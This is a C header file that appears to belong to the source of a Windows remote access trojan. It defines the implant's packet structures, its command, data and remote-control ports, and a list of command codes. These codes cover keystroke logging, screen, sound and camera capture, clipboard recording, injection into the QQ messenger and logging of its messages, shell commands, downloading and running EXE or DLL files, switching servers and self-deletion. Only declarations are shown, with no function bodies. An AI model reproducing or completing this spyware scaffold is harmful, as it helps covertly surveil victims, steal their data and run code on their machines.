
#pragma once
#ifndef NETWORK_H_H_H
#define NETWORK_H_H_H

#include <windows.h>
#include <winsock.h>

#define DATACRYPT					1
#define DATANONECRYPT				0
#define DATACOMPRESS				1
#define DATANONECOMPRESS			0


#define MAC_ADDRESS_SIZE		6
#define USERNAME_LIMIT_SIZE		16


#define SCREEN_MAX_TIME				900
#define SCREEN_MIN_TIME				30
#define APPSCREEN_SECLAST_FOCUSON	15

#pragma pack(1)
typedef struct
{
	unsigned char cMAC[MAC_ADDRESS_SIZE];
	unsigned char crypt;
	unsigned char compress;
	DWORD dwVolumeNO;
	unsigned char username[USERNAME_LIMIT_SIZE];
}UNIQUECLIENTSYMBOL, * LPUNIQUECLIENTSYMBOL;

typedef struct {
	int cmd;
	UNIQUECLIENTSYMBOL unique;
	int packlen;
}NETWORKPACKETHEADER, * LPNETWORKPACKETHEADER;


typedef struct {
	NETWORKPACKETHEADER packhdr;
	int srclen;
}NETWORKFILEHDR, * LPNETWORKFILEHDR;

typedef struct
{
	int iMaxTime;
	int iMinTime;
}SCREENSNAPSHOT_TIME, * LPSCREENSNAPSHOT_TIME;

typedef struct
{
	unsigned int iTimeDelay;
	char strAppName[MAX_PATH];
}APPSNAPSHOTPARAM, * LPAPPSNAPSHOTPARAM;


typedef struct {

	int name1len;
	char name1[16];
	int name2len;
	char name2[16];
}DOUBLESTRINGPARAM, * LPDOUBLESTRINGPARAM;

#pragma pack()


#define FILE_TRANSFER_ZERO			0X1FFFFFFE
#define FILE_TRANSFER_TOO_BIG		0X1FFFFFFF
#define FILE_TRANSFER_NOT_FOUND		0X2FFFFFFF
#define RECV_DATA_OK				0X3FFFFFFF
#define HEARTBEAT					0X7FFFFFFF
#define QUERYSERVERCOMMAND			0XFFFFFFFF
#define SCREENSNAPSHOT				1
#define ONLINE						2
#define SYSTEMINFO					3
#define UPLOADFILE					4
#define HARDDISKALLFILE				5
#define DOWNLOADFILE				6
#define SHELLCOMMAND				7
#define KEYBOARDRECORD				8
#define APPSCREENSNAPSHOT			9
#define SCREENVIDEO					10
#define SOUNDRECORD					11
#define CAMERAPHOTO					12
#define CAMERAVIDEO					13
#define DISKFILERECORD				14
#define CLIPBOARDRECORD				15
#define INJECTQQ					16
#define QQMSGRECORD					17
#define SUICIDE						18
#define COMMANDRESULT				19
#define REMOTECONTROL				20
#define REMOTE_CLIENT_SCREEN		21
#define REMOTE_MOUSE_POS			22
#define REMOTE_LEFTBUTTONDOWN		23
#define REMOTE_LEFTBUTTONDOUBLECLICK 24
#define REMOTE_RBUTTONDOWN			25
#define REMOTE_RBUTTONDOUBLECLICK	26
#define REMOTE_KEYBOARD				27
#define REMOTECONTROL_END			28
#define REMOTE_MOUSEWHEEL			29
#define REMOTE_OLD_SCREEN			30
#define LOGINFORMATIONFILE			31
#define USBALLFILES					32
#define RUNNING_APPS				33
#define INSTALLED_APPS				34
#define REMOTECONTROL_PARAMS		35
#define MESSAGEBOX					36
#define DOWNLOADRUNEXE				37
#define DOWNLOADRUNDLL				38
#define REMOTE_NONE_SCREEN			39
#define DOWNLOADPROGRAM				40
#define REMOTE_DUMMY_PACKET			41
#define CHANGE_SERVER_ADDRESS		42
#define REMOTE_PIXEL_PACKET			43

#define MAC_ADDRESS_LENGTH			6
#define NETWORK_DATAPORT			20011
#define NETWORK_CMDPORT				20012
#define NETWORK_REMOTECTRLPORT		20013

#define MAX_BUF_SIZE				0x10000000
#define NETWORK_DATABUF_SIZE		0x10000
#define MAX_COMMAND_LENGTH			0x1000
#define HEARTBEAT_LOOP_DELAY		60000
#define NETWORK_ERROR_CODE			-1

#define DATASOCK_TIME_OUT_VALUE		180000
#define CMDSOCK_TIME_OUT_VALUE		180000

#define MIN_PACKET_BUFFER			1024

int SendCmdPacketWithParam(SOCKET s, int cmd, char* param, int paramsize);
int SendDataHeaderPacket(LPUNIQUECLIENTSYMBOL lpUnique, SOCKET s, int cmd, int size);
int SendCmdPacket(LPUNIQUECLIENTSYMBOL lpUnique, SOCKET s, int cmd);
int SendCmdPacket(SOCKET s, int cmd);
int RecvCmdPacket(SOCKET s);
int __stdcall NetworkData();
int uploadData(char* lpBuf, unsigned int dwSize, unsigned int dwFlag, char* szAppName);
#endif